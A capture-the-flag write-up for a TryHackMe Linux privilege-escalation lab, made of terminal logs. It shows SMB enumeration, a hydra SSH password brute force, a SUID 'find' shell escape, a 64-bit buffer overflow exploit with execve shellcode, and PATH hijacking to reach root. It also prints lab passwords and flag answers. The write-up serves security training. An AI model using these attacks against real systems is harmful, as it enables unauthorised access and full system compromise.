# Binex

Objective: Escalate your privileges by exploiting vulnerable binaries.

## Gain initial access

Enumerate the machine and get an interactive shell. Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation.

There are more points up for grabs in this room.

*What are the login credential for initial access.*


```
nmap -Pn 10.10.85.84 -T4 -vv
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-18 05:47 BST
Initiating ARP Ping Scan at 05:47
Scanning 10.10.85.84 [1 port]
Completed ARP Ping Scan at 05:47, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:47
Completed Parallel DNS resolution of 1 host. at 05:47, 0.00s elapsed
Initiating SYN Stealth Scan at 05:47
Scanning 10.10.85.84 [1000 ports]
Discovered open port 445/tcp on 10.10.85.84
Discovered open port 139/tcp on 10.10.85.84
Discovered open port 22/tcp on 10.10.85.84
Completed SYN Stealth Scan at 05:47, 0.07s elapsed (1000 total ports)
Nmap scan report for 10.10.85.84
Host is up, received arp-response (0.00013s latency).
Scanned at 2025-06-18 05:47:04 BST for 0s
Not shown: 997 closed ports
Reason: 997 resets
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 02:76:80:13:AD:75 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.040KB)
root@ip-10-10-201-253:~# enum4linux -a 10.10.85.84
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jun 18 05:48:10 2025

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.85.84
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 10.10.85.84    |
 =================================================== 
[+] Got domain/workgroup name: WORKGROUP

 =========================================== 
|    Nbtstat Information for 10.10.85.84    |
 =========================================== 
Looking up status of 10.10.85.84
	THM_EXPLOIT     <00> -         B <ACTIVE>  Workstation Service
	THM_EXPLOIT     <03> -         B <ACTIVE>  Messenger Service
	THM_EXPLOIT     <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ==================================== 
|    Session Check on 10.10.85.84    |
 ==================================== 
[+] Server 10.10.85.84 allows sessions using username '', password ''

 ========================================== 
|    Getting domain SID for 10.10.85.84    |
 ========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ===================================== 
|    OS information on 10.10.85.84    |
 ===================================== 
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for 10.10.85.84 from smbclient: 
[+] Got OS info for 10.10.85.84 from srvinfo:
	THM_EXPLOIT    Wk Sv PrQ Unx NT SNT THM_exploit server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================ 
|    Users on 10.10.85.84    |
 ============================ 
Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 876.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 879.

Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 892.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 894.

 ======================================== 
|    Share Enumeration on 10.10.85.84    |
 ======================================== 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.85.84
//10.10.85.84/print$	Mapping: DENIED, Listing: N/A
//10.10.85.84/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 =================================================== 
|    Password Policy Information for 10.10.85.84    |
 =================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 ============================= 
|    Groups on 10.10.85.84    |
 ============================= 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ====================================================================== 
|    Users on 10.10.85.84 via RID cycling (RIDS: 500-550,1000-1050)    |
 ====================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2007993849-1719925537-2372789573
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-2007993849-1719925537-2372789573 and logon username '', password ''
S-1-5-21-2007993849-1719925537-2372789573-500 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-501 THM_EXPLOIT\nobody (Local User)
S-1-5-21-2007993849-1719925537-2372789573-502 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-503 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-504 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-505 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-506 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-507 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-508 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-509 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-510 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-511 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-512 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-513 THM_EXPLOIT\None (Domain Group)
S-1-5-21-2007993849-1719925537-2372789573-514 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-515 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-516 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-517 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-518 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-519 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-520 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-521 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-522 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-523 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-524 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-525 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-526 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-527 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-528 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-529 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-530 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-531 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-532 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-533 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-534 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-535 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-536 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-537 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-538 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-539 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-540 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-541 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-542 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-543 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-544 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-545 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-546 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-547 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-548 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-549 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-550 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1000 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1001 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1002 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1003 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1004 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1005 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1006 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1007 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1008 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1009 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1010 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1011 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1012 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1013 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1014 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1015 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1016 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1017 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1018 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1019 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1020 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1021 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1022 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1023 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1024 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1025 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1026 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1027 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1028 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1029 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1030 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1031 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1032 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1033 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1034 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1035 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1036 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1037 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1038 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1039 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1040 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1041 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1042 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1043 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1044 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1045 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1046 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1047 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1048 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1049 *unknown*\*unknown* (8)
S-1-5-21-2007993849-1719925537-2372789573-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)

 ============================================ 
|    Getting printer info for 10.10.85.84    |
 ============================================ 
No printers returned.


enum4linux complete on Wed Jun 18 05:48:30 2025
```

## SUID :: Binary 1

Read the flag.txt from des's home directory.


*What is the contents of /home/des/flag.txt?*

```
smbclient -L 10.10.85.84 -U anomymous
Password for [WORKGROUP\anomymous]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

```
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://10.10.85.84
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-18 05:52:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.85.84:22/
[STATUS] 183.00 tries/min, 183 tries in 00:01h, 14344222 to do in 1306:24h, 16 active
[STATUS] 141.00 tries/min, 423 tries in 00:03h, 14343982 to do in 1695:31h, 16 active
[STATUS] 117.71 tries/min, 824 tries in 00:07h, 14343582 to do in 2030:51h, 16 active
[22][ssh] host: 10.10.85.84   login: tryhackme   password: thebest
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 10 final worker threads did not complete until end.
[ERROR] 10 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-18 06:00:03
```

```
ssh tryhackme@10.10.85.84
The authenticity of host '10.10.85.84 (10.10.85.84)' can't be established.
ECDSA key fingerprint is SHA256:NipHeRkae+ZXJ9MuJ8jOgnO9n1/DBmiBqIDn9/mdEyU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.85.84' (ECDSA) to the list of known hosts.
tryhackme@10.10.85.84's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jun 18 04:58:43 UTC 2025

  System load:  0.19               Processes:           129
  Usage of /:   21.9% of 19.56GB   Users logged in:     0
  Memory usage: 20%                IP address for ens5: 10.10.85.84
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

59 packages can be updated.
0 updates are security updates.


Last login: Fri Jan 17 13:24:24 2020 from 192.168.247.130
tryhackme@THM_exploit:~$ cat /home/des/flag.txt
cat: /home/des/flag.txt: Permission denied
tryhackme@THM_exploit:~$ ls -la /home/des/flag.txt
ls: cannot access '/home/des/flag.txt': Permission denied
tryhackme@THM_exploit:~$ ls -la /home/des
ls: cannot open directory '/home/des': Permission denied
tryhackme@THM_exploit:~$ ls
tryhackme@THM_exploit:~$ pwd
/home/tryhackme
tryhackme@THM_exploit:~$ cd ..
tryhackme@THM_exploit:/home$ ls
des  kel  noentry  tryhackme
tryhackme@THM_exploit:/home$ ls -la
total 24
drwxr-xr-x  6 root      root      4096 Jan 17  2020 .
drwxr-xr-x 26 root      root      4096 Jan 12  2020 ..
drwx------  4 des       des       4096 Jan 17  2020 des
drwx------  4 kel       kel       4096 Jan 17  2020 kel
drwx------  4 noentry   noentry   4096 Jan 17  2020 noentry
drwxr-x---  4 tryhackme tryhackme 4096 Jan 17  2020 tryhackme
tryhackme@THM_exploit:/home$ find . -exec /bin/bash -p \; -quit
bash-4.4$ ls
des  kel  noentry  tryhackme
bash-4.4$ cd des
bash-4.4$ ls
bof  bof64.c  flag.txt
bash-4.4$ cat flag.txt
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{exploit_the_SUID}

login crdential (In case you need it)
username: des
password: destructive_72656275696c64
bash-4.4$ exit
exit
tryhackme@THM_exploit:/home$ sudo -l
[sudo] password for tryhackme: 
Sorry, user tryhackme may not run sudo on THM_exploit.
tryhackme@THM_exploit:/home$ find / -type f -perm -u=s -user des -ls 2> /dev/null
   262721    236 -rwsr-sr-x   1 des      des        238080 Nov  5  2017 /usr/bin/find
tryhackme@THM_exploit:/home$ ls -la /usr/bin/find
-rwsr-sr-x 1 des des 238080 Nov  5  2017 /usr/bin/find
tryhackme@THM_exploit:/home$ find . -exec /bin/bash -p \; -quit
bash-4.4$ ls
des  kel  noentry  tryhackme
bash-4.4$ cd des
bash-4.4$ ls
bof  bof64.c  flag.txt
bash-4.4$ cat flag.txt
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{exploit_the_SUID}

login crdential (In case you need it)
username: des
password: destructive_72656275696c64
```

## Buffer Overflow :: Binary 2

Read the flag.txt from kel's home directory.
If you are stuck, here are the hints for the exploit.

Hint 1: Step to overflow 64-bits buffer

Step 1: Generate a pattern, copy and paste this as input to the binary (use pattern_create.rb from
Metasploit)
Step 2: Read and copy the value from register RBP for the offset.
Step 3: Calculate the offset. (use pattern_offset.rb from Metasploit)
Step 4: Try control the register RIP with the following payload
Junk*(offset value) + 8 bytes of dummy
Step 5: Read the stack or register RSP to find a suitable return address.
Step 6: The general payload should be like below
Nop + shellcode + Junks + return address

Hint 2: Working shellcode

\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05

Hint 3: Running the payload with the binary

(python -c "print('\x90'*(fill in the number) + (shellcode) + 'A'*(fill in the number)
+(return address))";cat) | ./bof64

For your information, the Gnu debugger or gdb is installed with the machine. Happy hunting!

What is the contents of /home/kel/flag.txt?
```
bash-4.4$ su des
Password: 
des@THM_exploit:/home$ sudo -l
[sudo] password for des: 
Sorry, user des may not run sudo on THM_exploit.
des@THM_exploit:/home$ cd des
des@THM_exploit:~$ ls
bof  bof64.c  flag.txt
des@THM_exploit:~$ ./bof
Enter some string:
fff
You entered: fff
des@THM_exploit:~$ file bof
bof: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=4a53f62986d7ff151cb42f0bdf26ce36c28ca5dd, not stripped
cat exploit.py
from struct import pack
#buf="\xcc"*8
buf="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload="\x90"*400
payload += buf
payload += "A" * (208 -len(buf))
payload += "B" *8
payload += pack("<Q", 0x7fffffffe300)

print payload
des@THM_exploit:~$ python3 exploit.py | ./bof64
bash: ./bof64: No such file or directory
  File "exploit.py", line 10
    print payload
                ^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(payload)?
des@THM_exploit:~$ python exploit.py | ./bof64
bash: ./bof64: No such file or directory
close failed in file object destructor:
sys.excepthook is missing
lost sys.stderr
des@THM_exploit:~$ ls
bof  bof64.c  exploit.py  flag.txt
des@THM_exploit:~$ python -c "print('\x90'*400 + (\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05) + 'A'*(208-len(buf))+(^C;cat) | ./bof64
des@THM_exploit:~$ python exploit.py >test
des@THM_exploit:~$ (cat test;cat) | ./bof
Enter some string:
ffff
sh: 1: ffff: not found
whoami
kel
ls
ls: cannot open directory '.': Permission denied
cd /home/kel
ls
exe  exe.c  flag.txt
cat flag.txt
You flag is THM{buffer_overflow_in_64_bit}

The user credential
username: kel
password: kelvin_74656d7065726174757265
```

## PATH Manipulation :: Binary 3

What is the objective?
Get the root flag from the root directory. This will require you to understand how the PATH variable works.

*What is the contents of /root/root.txt?*
```
cd /tmp
ls
systemd-private-0f779aad101b42e0b596cddf443aa30f-systemd-resolved.service-qGxTHc  systemd-private-0f779aad101b42e0b596cddf443aa30f-systemd-timesyncd.service-Aj3keJ
echo "/bin/bash" > ps
chmod +x ps
export PATH=/tmp:$PATH
cd /home/kel
./exe
id
uid=0(root) gid=0(root) groups=0(root),1001(des)
cat /root/root.txt
The flag: THM{SUID_binary_and_PATH_exploit}. 
Also, thank you for your participation.

The room is built with love. DesKel out.
```
